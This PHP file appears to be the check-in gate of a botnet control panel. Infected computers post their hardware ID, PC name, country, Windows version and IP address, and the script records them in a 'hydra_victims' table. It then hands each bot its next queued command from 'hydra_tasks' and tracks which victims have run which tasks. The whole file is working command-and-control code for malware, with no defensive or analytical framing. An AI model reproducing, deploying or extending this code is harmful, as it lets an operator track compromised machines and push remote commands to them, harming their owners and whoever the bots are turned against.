<?php

include("admin/inc/config.php");
include("admin/inc/funcs.php");

if(isset($_POST['hwid'])) {
	$query = mysql_query("
	SELECT 
	(
		SELECT t.taskID
		FROM hydra_tasks AS t
		WHERE t.time <= '".time()."' AND ((
			t.elapsed > '".time()."' AND
			(SELECT count(*) FROM hydra_victims WHERE taskID=t.taskID AND ConTime >".(time()-$time_on).")<=bots
		) OR (t.elapsed=0 AND (
			SELECT count(*)
			FROM hydra_task_done
			WHERE taskID=t.taskID
		)<bots AND (
			SELECT count(*)
			FROM hydra_task_done
			WHERE taskID=t.taskID AND vicID=v.ID
		)=0))
		ORDER BY t.elapsed
		LIMIT 0,1
	) AS taskID,ID
	FROM hydra_victims AS v
	WHERE v.HWID='".mysql_escape_string($_POST['hwid'])."'");

	if(!mysql_num_rows($query)) {
		if(isset($_POST['pcname']) && isset($_POST['country']) && isset($_POST['winver']) && isset($_POST['hwid'])) mysql_query("INSERT INTO hydra_victims (`ID`, `PCName`, `BotVersion`, `InstTime`, `ConTime`, `Country`, `WinVersion`, `HWID`, `IP`) VALUES (NULL, '".mysql_escape_string($_POST['pcname'])."', '".mysql_escape_string($_POST['botver'])."', '".time()."', '".time()."', '".mysql_escape_string($_POST['country'])."', '".mysql_escape_string($_POST['winver'])."', '".mysql_escape_string($_POST['hwid'])."', '".mysql_escape_string($_POST['ip'])." / ".$_SERVER['REMOTE_ADDR']."')");
		die();
	} else {
		$ds = mysql_fetch_array($query);
		$task = mysql_fetch_array(mysql_query("SELECT elapsed,command FROM hydra_tasks WHERE taskID='".$ds['taskID']."'"));
		mysql_query("UPDATE `hydra_victims` SET `ConTime` = '".time()."', IP='".mysql_escape_string($_POST['ip'])." / ".$_SERVER['REMOTE_ADDR']."', taskID='".($task['elapsed'] ? $ds['taskID'] : 0)."', BotVersion='".mysql_escape_string($_POST['botver'])."' WHERE ID='".$ds['ID']."'");
		if(!$task['elapsed']) mysql_query("INSERT INTO hydra_task_done VALUES ('".$ds['taskID']."', '".$ds['ID']."')");
		die($task['command']);
	}
	
}
?>